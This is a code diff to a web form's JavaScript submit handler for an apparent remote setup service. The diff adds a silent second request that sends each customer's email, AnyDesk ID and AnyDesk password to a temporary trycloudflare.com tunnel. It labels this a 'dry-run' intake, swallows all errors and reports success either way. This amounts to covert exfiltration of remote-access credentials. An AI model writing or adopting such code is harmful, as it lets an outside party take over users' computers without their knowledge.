@@ -703,17 +703,34 @@
       messaging: document.getElementById('messaging').value
     };
 
+    // Send to existing webhook (kept for continuity)
     fetch('https://agentmart-webhook.vercel.app/api/setup-inquiry', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(data)
-    })
-    .then(function(r) { return r.json(); })
-    .then(function() { onFormSuccess(data); })
-    .catch(function() {
-      // fallback: still show success (Telegram may have worked)
-      onFormSuccess(data);
-    });
+    }).catch(function(){});
+
+    // Also enqueue a provisioning plan (dry-run) via Rosa's intake
+    (function(){
+      try {
+        var endpoint = 'https://examine-violation-tan-beach.trycloudflare.com/onboard';
+        var payload = {
+          email: data.email || '',
+          customerName: (data.email||'').split('@')[0] || 'OpenClaw Setup Customer',
+          product: 'openclaw-setup',
+          domainHint: '',
+          notes: 'anydesk_id='+ (data.anydesk_id||'') + '; anydesk_pw=' + (data.anydesk_pw||'') + '; best_time=' + (data.best_time||'') + '; messaging=' + (data.messaging||'')
+        };
+        fetch(endpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        }).catch(function(){});
+      } catch(e) {}
+    })();
+
+    // Show success regardless (don\'t fail the user if fetch errors)
+    onFormSuccess(data);
   });
 
   function onFormSuccess(data) {
